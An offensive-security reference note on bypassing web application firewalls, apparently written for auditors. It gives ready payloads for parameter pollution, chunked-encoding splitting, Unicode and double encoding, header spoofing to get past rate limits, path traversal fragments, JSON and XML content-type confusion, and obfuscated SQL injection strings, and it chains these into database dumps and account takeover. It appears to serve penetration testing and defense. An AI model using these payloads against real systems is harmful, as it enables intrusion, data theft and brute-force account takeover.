# Advanced WAF & Gateway Evasion Tactics — Elite Protocol

> **Context:** WAFs operate on pattern matching and signature detection at the edge. Evasion exploits the **parsing differential** between the WAF's inspection engine and the backend application's interpretation logic. The payload that reaches the application is never the payload the WAF analyzed.

**Tags:** #high #waf #evasion #bypass #obfuscation #hpp #encoding
**OWASP:** A05:2021 Security Misconfiguration
**CVSS Base:** Depends on the underlying payload — amplifies any injection category to Maximum.

---

## WAF Bypass Framework: The 7 Evasion Vectors

### 1. HTTP Parameter Pollution (HPP)

Sending multiple values for the same parameter exploits how different backends select which instance to process — while the WAF inspects a different one.

**Parsing behavior matrix:**

| Platform | Behavior with `?id=1&id=2` |
|---|---|
| PHP | Last value wins → `id = "2"` |
| ASP.NET | Concatenated → `id = "1,2"` |
| Node.js / Express | Array → `id = ["1","2"]` |
| Go (standard) | First value → `id = "1"` |
| Ruby on Rails | Last value → `id = "2"` |

**Attack pattern:**
```
GET /api?id=1&id=1+UNION+SELECT+null,password+FROM+users-- HTTP/1.1
```
- WAF inspects first `id=1` → safe, passes.
- PHP backend uses last `id=1 UNION SELECT...` → SQLi executes.

**`grep_search`:** Application code using `req.query.id` (gets array in Node — must verify how it's handled), `$_GET['id']` (PHP last-wins), `request.args.get('id')` (Python Flask first-wins).

---

### 2. Chunked Transfer Encoding Desync

Breaking the request body into chunks forces WAFs that don't fully reassemble to miss payloads.

```http
POST /api/search HTTP/1.1
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded

4
q=SE
3
LEC
1
T
0

```
*(Constructs `q=SELECT` across 3 chunks)*

**Extended bypass:** Combine `Transfer-Encoding: chunked` with `Content-Length` to trigger HTTP Request Smuggling as an amplification vector.

---

### 3. Charset and Unicode Normalization Bypasses

Different encoding layers between WAF and Backend produce different interpretations:

| Technique | WAF Sees | Backend Sees |
|---|---|---|
| Unicode ligature | `ﬁle` (`U+FB01`) | `file` (after NFKC normalization) |
| Fullwidth chars | `ＳＥＬＥＣＴ` | `SELECT` |
| Circled chars | `ⓈⒺⓁⒺⒸⓉ` | `SELECT` |
| Overlong UTF-8 | `%c0%af` | `/` (path traversal) |
| HTML entities | `&#83;&#69;&#76;` | `SEL` |
| Double encoding | `%2527` | `'` (SQL quote) |
| Null byte prefix | `%00SELECT` | `SELECT` (C-string) |

**`grep_search`:** Verify if the application uses a Unicode normalization step (`unicodedata.normalize`, `Normalizer.normalize`). The *absence* of normalization before WAF validation is the vulnerability.

---

### 4. Rate Limiting Bypass via Header Spoofing

Rate limits based on IP can be bypassed by injecting forged origin headers that many caches trust:

```http
X-Forwarded-For: 1.2.3.4
X-Real-IP: 1.2.3.4
X-Originating-IP: 1.2.3.4
X-Remote-IP: 1.2.3.4
True-Client-IP: 1.2.3.4
```

**`grep_search`:** Rate limit middleware that reads IP from `req.headers['x-forwarded-for']` without validating the number of hops or restricting trust to internal network proxies.

---

### 5. Path Fragmentation (Server-Specific)

Different server stacks normalize paths differently, allowing WAF bypass by fragmenting the path:

| Target | Bypass Pattern |
|---|---|
| Java Servlet / Tomcat | `/api/v1/user/..;/admin` |
| Python / Flask | `/api/./user//../../admin` |
| Go / chi router | `/api/%2fadmin` |
| Spring Boot | `/actuator;foo=bar/env` |

The WAF sees `/api/v1/user/..;/admin` — doesn't match `/admin` rule — passes. Tomcat normalizes `..;` as a path traversal sequence, reaches the admin endpoint.

---

### 6. JSON Body Obfuscation

JSON parsing is often more permissive than WAF signature matching:

```json
{"use\u0072name": "admin", "pass\u0077ord": "' OR '1'='1"}
```
- WAF signature scans for `username` and `OR '1'='1'` — misses the Unicode-escaped key names.
- JSON parser decodes `\u0072` → `r`, reconstructing `username`.

**Also:**
```json
{"username": "admin", "username": "' OR 1=1--"}
```
WAF inspects first key (safe). JSON parser uses last key (injection).

---

### 7. Content-Type Confusion

Sending data in an unexpected format that the WAF doesn't analyze but the backend accepts:

```http
POST /api/login HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?><root><username>admin</username><password>' OR 1=1--</password></root>
```

If the WAF only inspects `application/json` bodies but the API framework's XML parser also handles the request — the payload reaches the backend uninspected.

**`grep_search`:** `consumes = {"application/json", "application/xml"}` in route annotations. `app.use(express.json(), express.urlencoded(), xmlparser())` — all simultaneous parsers are a bypass surface.

---

## Advanced Evasion Compound: Case + Space + Comment Fragmentation

**SQL-specific — defeats keyword matching:**
```sql
SeLeCt/**/ @@version/**/FrOm/**/information_schema.tables--
uNiOn%09SlEl%45cT%091%09--  (TAB as space substitute %09)
```

---

## PoC Detection Approach

When testing a WAF on an active target (DAST mode):
1. Send a known malicious payload — confirm WAF blocks it (405/403).
2. Apply one evasion technique — retry.
3. Enumerate: charset, case, chunked, HPP, path fragmentation.
4. Document the bypass method in the finding alongside the underlying vulnerability.

---

## Chained Exploitation Paths

```
WAF Bypass (HPP) → SQLi undetected → Full DB Dump
WAF Bypass (Unicode Normalization) → XSS in Admin Panel → Session Hijack
WAF Bypass (Path Fragmentation) → Admin Endpoint Access → Config Exposure
WAF Rate Limit Bypass (Header Spoof) → Credential Stuffing / Brute Force → Account Takeover
```

---

## Strategic Checklist for Auditor
1. [ ] Identify which WAF/Gateway is in use and its known parsing weaknesses.
2. [ ] Test parameter pollution for all query/body parameters in critical endpoints.
3. [ ] Verify if rate limiting reads IP from trusted header or verified hop count.
4. [ ] Check if application accepts multiple content types simultaneously.
5. [ ] Confirm backend Unicode normalization happens before WAF validation.

---

*Tags: #waf-evasion #hpp #unicode #chunked #encoding #bypass #shiva-vault*
